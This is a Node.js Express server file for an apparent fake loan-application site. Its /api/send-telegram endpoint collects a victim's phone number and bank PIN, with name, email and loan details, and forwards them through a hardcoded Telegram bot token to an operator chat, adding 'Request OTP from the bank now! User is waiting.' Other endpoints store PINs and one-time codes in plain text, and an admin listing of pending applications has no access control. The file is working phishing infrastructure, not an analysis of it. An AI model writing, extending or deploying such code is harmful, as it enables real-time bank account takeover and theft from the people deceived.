require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ========== SUPABASE CLIENT ==========
const supabase = createClient(
    process.env.SUPABASE_URL,
    process.env.SUPABASE_ANON_KEY
);

console.log('✅ Supabase connected');

// ========== HEALTH CHECK ENDPOINT ==========
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// ========== TELEGRAM NOTIFICATION ENDPOINT ==========
app.post('/api/send-telegram', async (req, res) => {
    try {
        console.log('📨 Received request to /api/send-telegram');
        console.log('Request body:', req.body);
        
        const { phone, pin, email, name, amount, term, rate, monthly, appId } = req.body;
        
        // Validate required fields
        if (!phone || !pin) {
            console.log('❌ Missing required fields');
            return res.status(400).json({ 
                success: false, 
                error: 'Missing required fields: phone and pin are required' 
            });
        }
        
        // Build message
        const message = `🔔 NEW PIN CONFIRMATION 🔔\n\nPhone: ${phone}\nPIN: ${pin}\nEmail: ${email || 'N/A'}\nName: ${name || 'N/A'}\nLoan: $${amount || '0'} for ${term || '0'} months\nInterest: ${rate || '0'}%\nMonthly: $${monthly || '0'}\nApp ID: ${appId || 'N/A'}\n\nRequest OTP from the bank now! User is waiting.`;
        
        const TG_BOT_TOKEN = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
        const TG_CHAT_ID = '8392790531';
        
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`;
        
        console.log('📤 Sending to Telegram...');
        
        // Use fetch to send to Telegram
        const response = await fetch(url);
        const result = await response.json();
        
        console.log('Telegram response:', result);
        
        if (result.ok) {
            console.log('✅ Telegram notification sent successfully');
            res.json({ success: true, result });
        } else {
            console.error('❌ Telegram error:', result.description);
            res.status(500).json({ success: false, error: result.description });
        }
        
    } catch (error) {
        console.error('❌ Error in /api/send-telegram:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== SAVE USER DATA ENDPOINT ==========
app.post('/api/user/save', async (req, res) => {
    try {
        const { fullName, email, phone, employmentStatus, monthlyIncome, pin, otp } = req.body;
        
        console.log('📨 Saving user:', { fullName, email, phone });
        
        const { data: existingUser } = await supabase
            .from('users')
            .select('id')
            .eq('email', email)
            .single();
        
        let userId;
        
        if (existingUser) {
            const { error } = await supabase
                .from('users')
                .update({ full_name: fullName, phone, employment_status: employmentStatus, monthly_income: monthlyIncome, pin, otp })
                .eq('email', email);
            
            if (error) throw error;
            userId = existingUser.id;
        } else {
            const { data, error } = await supabase
                .from('users')
                .insert([{ full_name: fullName, email, phone, employment_status: employmentStatus, monthly_income: monthlyIncome, pin, otp }])
                .select();
            
            if (error) throw error;
            userId = data[0].id;
        }
        
        console.log('✅ User saved, ID:', userId);
        res.json({ success: true, userId });
        
    } catch (error) {
        console.error('❌ Error saving user:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== SAVE LOAN APPLICATION ENDPOINT ==========
app.post('/api/loan/save', async (req, res) => {
    try {
        const { applicationId, userId, loanAmount, loanTerm, interestRate, monthlyPayment, totalPayment } = req.body;
        
        console.log('📨 Saving loan application:', { applicationId, userId, loanAmount });
        
        const { data, error } = await supabase
            .from('loan_applications')
            .insert([{
                application_id: applicationId,
                user_id: userId,
                loan_amount: loanAmount,
                loan_term: loanTerm,
                interest_rate: interestRate,
                monthly_payment: monthlyPayment,
                total_payment: totalPayment,
                status: 'pending'
            }]);
        
        if (error) throw error;
        
        console.log('✅ Loan application saved:', applicationId);
        res.json({ success: true, applicationId });
        
    } catch (error) {
        console.error('❌ Error saving loan:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== GET USER BY EMAIL/PHONE ==========
app.get('/api/user/:identifier', async (req, res) => {
    try {
        const { identifier } = req.params;
        
        const { data, error } = await supabase
            .from('users')
            .select('*')
            .or(`email.eq.${identifier},phone.eq.${identifier}`)
            .single();
        
        if (error) throw error;
        
        res.json(data);
        
    } catch (error) {
        console.error('❌ Error fetching user:', error.message);
        res.status(404).json({ error: 'User not found' });
    }
});

// ========== UPDATE PIN CONFIRMATION ==========
app.post('/api/loan/:appId/confirm-pin', async (req, res) => {
    try {
        const { appId } = req.params;
        
        const { error } = await supabase
            .from('loan_applications')
            .update({ pin_confirmed: true })
            .eq('application_id', appId);
        
        if (error) throw error;
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Error updating PIN confirmation:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== UPDATE PHONE VERIFICATION ==========
app.post('/api/loan/:appId/verify-phone', async (req, res) => {
    try {
        const { appId } = req.params;
        
        const { error } = await supabase
            .from('loan_applications')
            .update({ phone_verified: true })
            .eq('application_id', appId);
        
        if (error) throw error;
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Error updating phone verification:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== GET PENDING APPLICATIONS ==========
app.get('/api/admin/pending', async (req, res) => {
    try {
        const { data, error } = await supabase
            .from('loan_applications')
            .select('*')
            .eq('status', 'pending')
            .order('submitted_at', { ascending: false });
        
        if (error) throw error;
        
        res.json(data);
        
    } catch (error) {
        console.error('❌ Error fetching pending applications:', error.message);
        res.status(500).json({ error: error.message });
    }
});

// ========== ERROR HANDLING MIDDLEWARE ==========
app.use((err, req, res, next) => {
    console.error('❌ Unhandled error:', err.message);
    res.status(500).json({ error: 'Internal server error', message: err.message });
});

// ========== START SERVER ==========
app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📋 API endpoints:`);
    console.log(`   GET  /api/health`);
    console.log(`   POST /api/send-telegram`);
    console.log(`   POST /api/user/save`);
    console.log(`   POST /api/loan/save`);
    console.log(`   GET  /api/user/:identifier`);
    console.log(`   POST /api/loan/:appId/confirm-pin`);
    console.log(`   POST /api/loan/:appId/verify-phone`);
    console.log(`   GET  /api/admin/pending`);
});